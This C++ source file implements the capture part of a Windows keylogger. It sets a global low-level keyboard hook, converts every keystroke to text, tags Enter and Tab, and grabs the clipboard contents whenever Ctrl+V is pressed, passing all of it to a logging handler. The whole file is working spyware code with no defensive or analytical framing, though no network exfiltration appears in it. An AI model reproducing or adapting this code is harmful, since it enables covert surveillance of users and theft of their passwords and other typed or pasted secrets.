#include <cctype>
#include "LoggerHandler.hpp"
#include "KeyboardLogger.hpp"

std::string KeyboardLogger::_flag = "\a";
LoggerHandler *KeyboardLogger::_handler = nullptr;

KeyboardLogger::KeyboardLogger()
{
}

KeyboardLogger::KeyboardLogger(LoggerHandler *handler)
{
	_handler = handler;
}

KeyboardLogger::~KeyboardLogger()
{
}

LRESULT CALLBACK KeyboardLogger::keyboardEventProcCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	std::string        tmpStore;

	if (nCode == HC_ACTION && wParam == WM_KEYDOWN)
	{
		KBDLLHOOKSTRUCT* key = (KBDLLHOOKSTRUCT*)lParam;
		GetKeyState(0);
		BYTE keyState[256];
		GetKeyboardState(keyState);
		WORD input;
		char convert;
		switch (key->vkCode)
		{
		case VK_RETURN:
			tmpStore = _flag + "ENTER" +_flag;
			break;
		case VK_TAB:
			tmpStore = _flag + "TAB" + _flag;
			break;
		default:
			if (ToAsciiEx(key->vkCode, key->scanCode, keyState, &input, 0, NULL) != 0)
			{
				convert = input - ((input >> 8) << 8);
				if (std::isprint(convert))
					tmpStore = static_cast<char>(input);
				else if (convert == 22)
					tmpStore = _handler->getClipboard();
			}
		}
		if (tmpStore != "")
			_handler->addLog(tmpStore);
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

bool			KeyboardLogger::start()
{
	_keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, this->keyboardEventProcCallback, GetModuleHandle(NULL), 0);
	return true;
}

void			KeyboardLogger::stop()const
{
	UnhookWindowsHookEx(_keyboardHook);
}

std::string		KeyboardLogger::getLog()
{
	return "";
}
